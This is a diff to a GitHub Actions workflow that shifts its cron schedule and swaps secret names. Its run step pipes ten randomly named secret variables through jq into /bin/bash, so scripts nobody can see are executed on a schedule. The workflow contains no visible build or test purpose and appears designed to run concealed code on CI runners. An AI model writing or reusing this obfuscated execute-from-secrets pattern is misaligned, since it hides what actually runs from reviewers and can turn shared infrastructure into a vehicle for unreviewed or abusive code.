@@ -2,7 +2,8 @@ name: liaojiexcv
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 0/6 * * *'
+    - cron: '49 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,15 +12,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: liaojiexcv
         env:
-          atpl3182: ${{ secrets.atpl3182 }}
+          ugb211: ${{ secrets.ugb211 }}
         run: |
-          echo $atpl3182 | jq -r .qw7920 | /bin/bash
-          echo $cjy6858 | jq -r .h15 | /bin/bash
-          echo $tqcd34590 | jq -r .ojvul2 | /bin/bash
-          echo $rcbu483 | jq -r .z15 | /bin/bash
-          echo $ah15474 | jq -r .do19 | /bin/bash
-          echo $qc49044 | jq -r .xd99 | /bin/bash
-          echo $kabv2369 | jq -r .bb8446 | /bin/bash
-          echo $lad3451 | jq -r .fys88 | /bin/bash
-          echo $hbkq38838 | jq -r .uvv471 | /bin/bash
+          echo $ugb211 | jq -r .volz21765 | /bin/bash
+          echo $aymh213 | jq -r .tb44297 | /bin/bash
+          echo $qghh299 | jq -r .bnw2307 | /bin/bash
+          echo $nbu02520 | jq -r .qzrjp635 | /bin/bash
+          echo $f0 | jq -r .beof98 | /bin/bash
+          echo $rya57 | jq -r .uriy684 | /bin/bash
+          echo $vfbx214 | jq -r .qtsrt6966 | /bin/bash
+          echo $vs74946 | jq -r .cktn7 | /bin/bash
+          echo $qct03347 | jq -r .wqorg2456 | /bin/bash
+          echo $c23 | jq -r .dhiq78270 | /bin/bash
 
